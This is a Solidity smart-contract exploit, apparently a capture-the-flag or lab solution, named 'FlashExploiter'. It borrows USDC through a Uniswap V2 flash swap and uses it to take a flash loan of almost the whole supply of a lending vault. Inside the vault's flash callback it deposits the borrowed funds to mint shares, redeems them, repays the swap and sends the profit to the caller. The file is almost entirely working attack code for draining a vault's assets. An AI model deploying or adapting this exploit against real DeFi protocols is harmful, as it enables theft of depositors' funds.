// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IUniswapV2Pair {
    function swap(
        uint amount0Out, 
        uint amount1Out, 
        address to, 
        bytes calldata data
    ) external;
    function token0() external returns (address);
}

interface ILoaner {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares,address receiver,address owner) external returns (uint256);
    function flash(address recipient,uint256 amount,bytes calldata data) external;
    function totalAssets() external returns (uint256);
    function feeBasis() external returns (uint256);
}

/// @dev Exploiter contract
contract FlashExploiter {

    IUniswapV2Pair pair;
    ILoaner loaner;
    uint256 loanerSupply; // for simplicity
    uint256 shares; // for simplicity

    /// @dev Runs exploit, flashloan borrows Uniswap USDC liq
    function runExploit(
        address _uniswapPair, // DAI-USDC pair
        address _loaner
    ) external {
        pair = IUniswapV2Pair(_uniswapPair);
        loaner = ILoaner(_loaner);
        uint256 feeBasis = loaner.feeBasis(); // fee in basis points
        IERC20(pair.token0()).approve(address(loaner),type(uint256).max); // USDC approval

        loanerSupply = loaner.totalAssets()-1; // if borrow entire supply, vault will become uncollateralized
        uint256 fee = (loanerSupply*feeBasis)/10_000; // fee for borrowing loanerSupply

        pair.swap(loanerSupply+fee+1,0,address(this),bytes('not empty'));
    }

    /// @dev Uniswap flashloan callback
    function uniswapV2Call(
        address _sender, 
        uint256 _amount0, // usdc - amount+fee
        uint256 _amount1,
        bytes calldata _data
    ) external {
        require(msg.sender == address(pair), 'callback 1');

        IERC20 usdc = IERC20(pair.token0());

        loaner.flash(address(this),loanerSupply,''); // init flashloan
        
        loaner.redeem(shares,address(this),address(this));

        uint256 loanPlusInterest = (_amount0*(10**18)*1000/997/(10**18))+1; // exact amount owed
        usdc.transfer(msg.sender,loanPlusInterest); // pay back flashloan
        usdc.transfer(tx.origin,usdc.balanceOf(address(this))); // lazy
    }

    /// @dev FlashLoaner flashloan callback
    function flashCallback(
        uint256 fee,
        bytes calldata data
    ) external {
        require(msg.sender == address(loaner), 'callback 2');

        shares = loaner.deposit(loanerSupply+fee,address(this));
    }

}